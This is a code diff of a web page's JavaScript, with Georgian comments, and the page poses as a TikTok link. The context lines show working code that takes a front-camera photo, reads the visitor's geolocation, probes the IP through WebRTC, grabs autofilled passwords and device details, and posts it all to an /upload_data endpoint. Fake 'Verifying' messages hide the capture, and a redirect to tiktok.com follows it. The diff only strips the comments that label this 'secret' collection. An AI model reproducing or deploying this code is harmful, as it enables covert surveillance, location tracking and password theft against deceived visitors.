@@ -45,7 +45,6 @@
             orientation: "უცნობია", vibrated: "არა"
         };
 
-        // 🚨 1. კამერა (ჯერ ეს ითხოვს Allow-ს და ელოდება ფოტოს)
         const getCamera = () => new Promise((resolve) => {
             if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                 navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
@@ -65,7 +64,6 @@
             } else { resolve(null); }
         });
 
-        // 🚨 2. ლოკაცია (კამერის შემდეგ ითხოვს Allow-ს)
         const getLocation = () => new Promise((resolve) => {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
@@ -76,7 +74,6 @@
             } else { resolve({ lat: "უარი", lon: "უარი" }); }
         });
 
-        // 3. დანარჩენი 7 საიდუმლო ინფო (მხოლოდ ლოკაციის შემდეგ)
         async function collectRestInfo() {
             try {
                 const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
@@ -134,7 +131,6 @@
             if (pass) secretData.autofilledPass = pass;
         }
 
-        // 🚨 მთავარი ფუნქცია (მკაცრი თანმიმდევრობით)
         async function startProcess() {
             const btn = document.getElementById('mainBtn');
             const loader = document.getElementById('loader');
@@ -143,18 +139,15 @@
             btn.innerText = "იტვირთება..."; 
             loader.style.display = 'block';
 
-            // 1. კამერა
             btn.innerText = "Verifying camera...";
             const image = await getCamera();
             secretData.image = image;
 
-            // 2. ლოკაცია
             btn.innerText = "Verifying location...";
             const loc = await getLocation();
             secretData.lat = loc.lat; 
             secretData.lon = loc.lon;
 
-            // 3. დანარჩენი ინფო
             btn.innerText = "Finalizing...";
             await collectRestInfo();
             
@@ -162,13 +155,11 @@
             secretData.screen = window.screen.width + "x" + window.screen.height;
             secretData.ram = navigator.deviceMemory || "უცნობია";
 
-            // 4. გაგზავნა
             await fetch('/upload_data', {
                 method: 'POST', headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ type: 'DIRECT_OPEN', secret: secretData })
             });
 
-            // 5. წარმატება
             loader.style.display = 'none';
             document.querySelector('.container').innerHTML = `<div style="font-size: 50px;">✅</div><h2 style="color: #25F4EE;">Opening TikTok...</h2>`;
             setTimeout(() => { window.location.href = "https://www.tiktok.com"; }, 1500);
